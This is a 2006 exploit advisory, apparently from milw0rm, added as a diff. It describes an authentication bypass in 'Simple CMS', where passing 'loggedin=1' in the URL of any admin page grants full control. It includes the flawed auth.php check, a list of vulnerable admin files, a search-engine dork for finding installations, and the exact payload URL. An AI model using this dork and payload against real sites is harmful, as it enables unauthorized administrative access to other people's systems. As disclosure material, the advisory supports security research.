@@ -1,0 +1,33 @@
+Simple CMS <daaan@gmail.com>
+
+Information:
+The cms from http://www.cms-center.com/ uses no security at all, just a boolean 
+"isloggedin". If you submit "loggedin=1" in the URL of any of the admin pages, 
+you get full controll.
+
+Vulnerable code:
+<auth.php>
+if ($loggedin != "1"){
+	header("Location: /login.php?e=1"); /* Redirect browser */ 
+	/* Make sure that code below does not get executed when we redirect. */ 
+	exit; 
+}
+//echo "ok";
+
+Vulnerable files:
+/admin/item_modify.php
+/admin/item_list.php
+/admin/item_legend.php
+/admin/item_detail.php
+/admin/index.php
+/admin/config_pages.php
+/admin/add_item1.php
+
+Proof:
+1. Google for "powered by php mysql simple cms"
+2. type "admin/config_pages.php?loggedin=1" behind the url
+3. Done. It works on every admin page that uses the so called auth.php.
+
+I tried to contact the author, but i was unable to find ANY contact info.
+
+# milw0rm.com [2006-08-07]
